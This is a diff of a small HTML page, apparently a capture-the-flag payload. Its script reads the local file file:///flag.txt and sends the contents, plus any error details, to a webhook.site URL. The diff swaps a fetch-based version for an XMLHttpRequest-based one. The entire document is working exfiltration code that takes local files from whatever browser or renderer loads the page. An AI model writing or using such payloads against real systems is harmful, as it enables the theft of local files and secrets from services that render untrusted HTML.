@@ -1,16 +1,23 @@
 <!DOCTYPE html>
 <html>
 <script>
-// Try to read local files or make requests
-fetch('file:///flag.txt')
-    .then(response => response.text())
-    .then(data => {
-        // Exfiltrate the flag somehow - maybe to your server
-        fetch('https://webhook.site/bc26ecde-2e1b-4b01-af18-8d14d15de90f/?flag=' + encodeURIComponent(data));
-    })
-    .catch(error => {
-        // Call webhook with error information if fetch fails
-        fetch('https://webhook.site/bc26ecde-2e1b-4b01-af18-8d14d15de90f/?error=' + encodeURIComponent(error.message));
-    });
+// Try XMLHttpRequest instead of fetch
+var xhr = new XMLHttpRequest();
+xhr.open('GET', 'file:///flag.txt', true);
+xhr.onreadystatechange = function() {
+    if (xhr.readyState === 4) {
+        if (xhr.status === 200 || xhr.status === 0) {
+            // Success - send the flag
+            fetch('https://webhook.site/bc26ecde-2e1b-4b01-af18-8d14d15de90f/?flag=' + encodeURIComponent(xhr.responseText));
+        } else {
+            // Error - send status
+            fetch('https://webhook.site/bc26ecde-2e1b-4b01-af18-8d14d15de90f/?xhr_error=status_' + xhr.status);
+        }
+    }
+};
+xhr.onerror = function() {
+    fetch('https://webhook.site/bc26ecde-2e1b-4b01-af18-8d14d15de90f/?xhr_error=network_error');
+};
+xhr.send();
 </script>
 </html>
